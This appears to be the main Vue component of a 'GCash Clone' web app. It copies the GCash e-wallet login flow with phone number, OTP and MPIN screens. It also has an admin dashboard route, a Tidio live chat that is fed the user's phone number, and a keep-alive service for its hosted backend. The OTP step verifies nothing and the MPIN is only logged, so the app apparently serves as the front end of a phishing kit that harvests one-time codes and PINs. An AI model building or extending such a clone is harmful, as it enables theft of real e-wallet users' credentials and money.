<script setup>
import { ref, onMounted, onUnmounted } from 'vue'
import NumberScreen from './components/Number.vue'
import OTPScreen from './components/OTP.vue'
import MPINScreen from './components/MPIN.vue'
import AdminDashboard from './components/AdminDashboard.vue'
import ChatBot from './components/ChatBot.vue'
import tidioService from './services/tidioService.js'
import ChatIntegrationTest from './utils/chatTest.js'
import TidioValidator from './utils/tidioValidator.js'
import keepAliveService from './services/keepAlive.js'

const currentView = ref('number')
const phoneNumber = ref('')
const userContext = ref({})

// Check for admin route and setup URL routing
onMounted(async () => {
  const path = window.location.pathname
  const urlParams = new URLSearchParams(window.location.search)
  const isAdmin = path === '/admin' || path.includes('/admin') || urlParams.get('admin') === 'true'
  
  console.log('🔍 Admin check:', { pathname: path, isAdmin: isAdmin })
  
  if (isAdmin) {
    console.log('👑 Admin route detected - loading AdminDashboard')
    currentView.value = 'admin'
  } else {
    console.log('📱 Regular route - loading NumberScreen')
  }
  
  // Listen for browser back/forward buttons
  window.addEventListener('popstate', (event) => {
    const currentPath = window.location.pathname
    if (currentPath === '/admin' || currentPath.includes('/admin')) {
      currentView.value = 'admin'
    } else {
      currentView.value = 'number'
      phoneNumber.value = ''
    }
  })
  
  // Tidio loads automatically via script in index.html
  console.log('Tidio integration active - loads via script tag')
  
  // Start backend keep-alive service (prevents Render.com sleeping)
  keepAliveService.start()
  
  // Run integration tests in development
  if (import.meta.env.DEV) {
    setTimeout(() => {
      const tester = new ChatIntegrationTest()
      tester.runAllTests()
    }, 3000) // Increased delay to let Tidio fully load
  }
})

// Cleanup on component unmount
onUnmounted(() => {
  keepAliveService.stop()
})

const handlePhoneSubmitted = (fullPhone) => {
  phoneNumber.value = fullPhone
  currentView.value = 'otp'
}

const handleOTPVerify = () => {
  setTimeout(() => {
    currentView.value = 'mpin'
  }, 500)
}

const handleResendCode = () => {
  console.log('Resending code to:', phoneNumber.value)
  // Handle resend logic here
}

const handleMPINVerified = (mpinCode) => {
  console.log('MPIN verified:', mpinCode)
  
  // Set user context for Tidio chatbot
  const context = {
    phoneNumber: phoneNumber.value,
    isAuthenticated: true,
    userId: `user_${phoneNumber.value.replace('+', '')}`,
    name: 'GCash User',
    balance: 1500.00, // This would come from actual API
    lastTransaction: 'Money sent to John Doe'
  }
  
  userContext.value = context
  tidioService.setUserContext(context)
  console.log('User context set for chatbot support')
}

const handleChangePhone = () => {
  // Go back to number entry page
  currentView.value = 'number'
  phoneNumber.value = ''
}

const handleForgotMPIN = () => {
  console.log('Forgot MPIN clicked')
  // Handle forgot MPIN logic here
}

// Admin access with URL update
const goToAdmin = () => {
  console.log('👑 Admin access requested')
  currentView.value = 'admin'
  window.history.pushState({ view: 'admin' }, 'Admin Dashboard', '/admin')
}

// Return to main page
const backToMain = () => {
  console.log('🏠 Returning to main page')
  currentView.value = 'number'
  phoneNumber.value = ''
  window.history.pushState(null, 'GCash Clone', '/')
}

// Debug flag for development
const isDev = import.meta.env.DEV
</script>

<template>
  <!-- Debug: Show current view and admin access in development -->
  <div v-if="isDev" style="position: fixed; top: 10px; right: 10px; background: rgba(0,0,0,0.8); color: white; padding: 5px 10px; border-radius: 5px; font-size: 12px; z-index: 9999;">
    <div>Current View: {{ currentView }}</div>
    <button @click="goToAdmin" v-if="currentView !== 'admin'" style="background: #007bff; color: white; border: none; padding: 3px 8px; border-radius: 3px; margin-top: 5px; cursor: pointer; font-size: 11px;">
      Go to Admin
    </button>
    <button @click="backToMain" v-if="currentView === 'admin'" style="background: #6c757d; color: white; border: none; padding: 3px 8px; border-radius: 3px; margin-top: 5px; cursor: pointer; font-size: 11px;">
      Back to Main
    </button>
  </div>
  
  <AdminDashboard v-if="currentView === 'admin'" />
  <NumberScreen v-else-if="currentView === 'number'" @phone-submitted="handlePhoneSubmitted" />
  <OTPScreen
    v-else-if="currentView === 'otp'"
    :phone-number="phoneNumber"
    @verify="handleOTPVerify"
    @resend="handleResendCode"
  />
  <MPINScreen
    v-else-if="currentView === 'mpin'"
    :phone-number="phoneNumber"
    @mpin-verified="handleMPINVerified"
    @change-phone="handleChangePhone"
    @forgot-mpin="handleForgotMPIN"
  />
  
  <!-- Tidio Chatbot - Available on all screens -->
  <!-- Custom ChatBot disabled - using Tidio's professional interface -->
  <!--
  <ChatBot 
    :user-context="userContext"
    :display-mode="currentView === 'admin' ? 'inline' : 'floating'"
  />
  -->
</template>
